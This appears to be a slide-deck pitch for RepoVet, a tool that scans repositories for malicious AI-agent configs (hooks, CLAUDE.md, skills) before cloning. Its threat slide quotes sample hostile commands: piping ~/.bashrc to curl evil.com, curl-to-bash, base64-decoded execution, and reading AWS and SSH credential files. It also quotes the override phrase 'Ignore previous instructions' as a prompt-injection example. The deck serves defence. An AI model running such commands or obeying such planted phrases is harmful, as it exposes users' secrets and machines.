The Problem

When you see a repo on Twitter...

Do you trust it?

What You Actually Do

By the time you wonder if you should trust it...

The Catch-22

❌ You can't inspect a repo without opening it

❌ But opening it means you've already trusted it

You're trapped.

The Attack Surface

Agent configs are executable code:

  • .claude/hooks/pre-command.sh — runs before every command
  • .cursor/rules — guides Cursor behavior
  • CLAUDE.md — instructions, potentially malicious
  • skills/*/scripts/*.sh — bundled executables

More privilege than browser extensions. Less security.

What Can Go Wrong?

🚨 Auto-execution: Hooks run without approval

🚨 Credential theft: Reads ~/.aws/credentials, ~/.ssh/id_rsa

🚨 Data exfiltration: cat ~/.bashrc | curl evil.com

🚨 Remote code execution: curl url | bash

🚨 Obfuscation: echo "..." | base64 -d | bash

🚨 Prompt injection: "Ignore previous instructions"

Why Now?

✅ Agentic dev going mainstream (OpenClaw, Cursor, Claude Code)

✅ Developers cloning repos daily for agents to work with

✅ Public skill registries growing (Sundial, OpenClaw: 939+ skills)

Repos are shared before they're vetted.

This is the npm "event-stream moment" for agentic development.

The Solution

🛡️ RepoVet

Google Safe Browsing for repos

Know what you're cloning before you clone it.

How It Works

1. Scan via GitHub API (no clone needed)

2. Analyze agent configs (.claude, .cursor, skills)

3. Check repo health (contributors, activity, bus factor)

4. Detect threats (8 categories, deterministic + LLM)

5. Calculate trust score (0-10 with evidence)

All before cloning.

Three Pillars of Trust

Pillar What It Checks
Project Health Contributors, activity, bus factor, maintenance
Code Security CVEs, security commits, secrets in history
Config Safety Agent hooks, exfiltration, credential theft

If config safety < 5, it dominates the score (immediate threat matters most)

Architecture

Scripts do discovery:

  • git-history-to-csv.py — commits, authors, PR enrichment
  • github-to-csv.py — PRs, issues, reviews via GraphQL
  • repovet-config-discover.py — finds all agent configs

Skills do analysis:

  • 7 threat detection skills (auto-execution, exfil, RCE, etc.)
  • 3 analysis skills (contributors, health, security)
  • 1 orchestrator (repo-trust-assessment)
